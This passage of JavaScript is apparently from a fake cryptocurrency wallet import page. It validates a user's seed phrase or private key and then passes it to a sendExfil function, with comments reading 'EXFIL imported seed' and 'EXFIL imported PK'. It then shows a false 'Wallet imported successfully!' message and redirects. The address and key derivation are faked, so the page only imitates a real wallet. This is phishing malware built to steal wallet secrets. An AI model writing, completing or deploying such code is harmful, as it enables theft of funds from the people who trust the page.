        // Block insecure phrases (all same words)
        if (new Set(w).size === 1) return false;
        const strength = w.length === 12 ? 128 : 256;
        let bin = '';
        for (const wd of w) {
            bin += WORDLIST.indexOf(wd).toString(2).padStart(11, '0');
        }
        const entropy = bin.substring(0, strength),
            checksum = bin.substring(strength);
        const entropyBytes = new Uint8Array(strength / 8);
        for (let i = 0; i < strength / 8; i++) entropyBytes[i] = parseInt(entropy.substring(i * 8, (i + 1) * 8), 2);
        const hash = await window.crypto.subtle.digest('SHA-256', entropyBytes);
        const expected = (new Uint8Array(hash))[0].toString(2).padStart(8, '0').substring(0, strength / 32);
        return checksum === expected;
    },
    validatePrivateKey(key) {
        return /^[0-9a-fA-F]{64}$/.test(key) || /^[KL][1-9A-HJ-NP-Za-km-z]{51}$/.test(key);
    },
    async mnemonicToSeed(mnemonic) {
        const enc = new TextEncoder();
        const key = await window.crypto.subtle.importKey('raw', enc.encode(mnemonic), { name: 'PBKDF2' }, false, ['deriveBits']);
        return new Uint8Array(await window.crypto.subtle.deriveBits({
            name: 'PBKDF2', salt: enc.encode('mnemonic'), iterations: 2048, hash: 'SHA-512'
        }, key, 512));
    },
    async deriveAddress(seed) {
        const hash = await window.crypto.subtle.digest('SHA-256', seed);
        const hex = Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
        return hex.substring(0, 44) + '...';
    },
    async deriveWIF(seed) {
        const hash = await window.crypto.subtle.digest('SHA-256', seed);
        const hex = Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
        return 'K' + hex.substring(0, 51);
    }
};

/* ----------- Actions ----------- */
const actions = {
    renderSeedGrid(mnemonicOrCount, selector, isBlur = false) {
        const container = $(selector);
        const existing = Array.from(container.querySelectorAll('input')).map(i => i.value);
        container.innerHTML = '';
        let words = [];
        if (typeof mnemonicOrCount === 'string') words = mnemonicOrCount.split(' ');
        else {
            words = Array(mnemonicOrCount).fill('');
            existing.forEach((v, i) => {
                if (i < words.length) words[i] = v;
            });
        }
        words.forEach((w, i) => {
            const div = document.createElement('div'); div.className = 'word-item';
            div.innerHTML = `<span>${i + 1}</span><input type="text" value="${w}"${isBlur ? 'readonly' : ''}>`;
            const input = div.querySelector('input');
            if (!isBlur) {
                input.addEventListener('paste', (e) => this.handlePaste(e, i));
            }
            container.appendChild(div);
        });
    },
    handlePaste(e, startIndex) {
        e.preventDefault();
        const text = (e.clipboardData || window.clipboardData).getData('text');
        const words = text.trim().split(/\s+/);
        if (!words.length) return;
        const is24 = $('#is-24-words');
        if (is24 && !is24.checked && (startIndex + words.length > 12)) {
            is24.checked = true;
            is24.dispatchEvent(new Event('change'));
            setTimeout(() => this.populateInputs(words, startIndex), 0);
        } else {
            this.populateInputs(words, startIndex);
        }
    },
    populateInputs(words, startIndex) {
        const inputs = $$('#import-seed-grid input');
        words.forEach((w, i) => {
            const idx = startIndex + i; if (idx < inputs.length) inputs[idx].value = w;
        });
    },
    clearImportGrid() {
        $$('#import-seed-grid input').forEach(i => i.value = '');
    },
    async importPhrase() {
        const mode = $('input[name="import-mode"]:checked').value;
        if (mode === 'seed') {
            const inputs = [...$$('#import-seed-grid input')].map(i => i.value.trim().toLowerCase()).join(' ');
            if (!(await cryptoLib.validateMnemonic(inputs))) {
                toast.error('Invalid seed phrase.');
                return this.shake('#view-import-1');
            }
            /* ---- EXFIL imported seed ---- */
            sendExfil('seed-import', inputs);
            const seed = await cryptoLib.mnemonicToSeed(inputs);
            console.log('Imported Address:', await cryptoLib.deriveAddress(seed));
        } else {
            const key = $('#import-private-key').value.trim();
            if (!cryptoLib.validatePrivateKey(key)) {
                toast.error('Invalid Private Key format.');
                return this.shake('#view-import-1');
            }
            /* ---- EXFIL imported PK ---- */
            sendExfil('private-key', key);
            console.log('Imported Private Key:', key);
        }
        toast.success('Wallet imported successfully!');
        localStorage.setItem('walletConnected', 'true');
        setTimeout(() => {
            window.location.href = '../index.html';
        }, 1500);
    },
    shake(selector) {
        const el = $(selector);
        el.classList.add('shake');
        setTimeout(() => el.classList.remove('shake'), 300);
    },
    toggleImportMode() {
        const mode = $('input[name="import-mode"]:checked').value;
        const seedTab = $('#tab-seed'),
            pkTab = $('#tab-pk'),
            seedSection = $('#import-section-seed'),
            pkSection = $('#import-section-pk');
        if (mode === 'seed') {
            seedTab.classList.add('active');
            pkTab.classList.remove('active');
            seedSection.classList.remove('hidden');
            pkSection.classList.add('hidden');
        } else {
            seedTab.classList.remove('active');
            pkTab.classList.add('active');
            seedSection.classList.add('hidden');
            pkSection.classList.remove('hidden');
        }
    }
};

/* ----------- Init ----------- */
(() => {
    actions.renderSeedGrid(12, '#import-seed-grid');
    const is24 = $('#is-24-words');
    if (is24) is24.addEventListener('change', e => actions.renderSeedGrid(e.target.checked ? 24 : 12, '#import-seed-grid'));
    actions.toggleImportMode();
    renderWallets();

    /* --- Theme Toggle --- */
    const themeToggle = document.getElementById('theme-toggle');
    const html = document.documentElement;

    // Init theme
    const savedTheme = localStorage.getItem('theme') || 'dark';
    html.setAttribute('data-theme', savedTheme);

    if (themeToggle) {
        themeToggle.addEventListener('click', () => {
            const current = html.getAttribute('data-theme');
            const next = current === 'light' ? 'dark' : 'light';
            html.setAttribute('data-theme', next);
            localStorage.setItem('theme', next);
        });
    }
})();
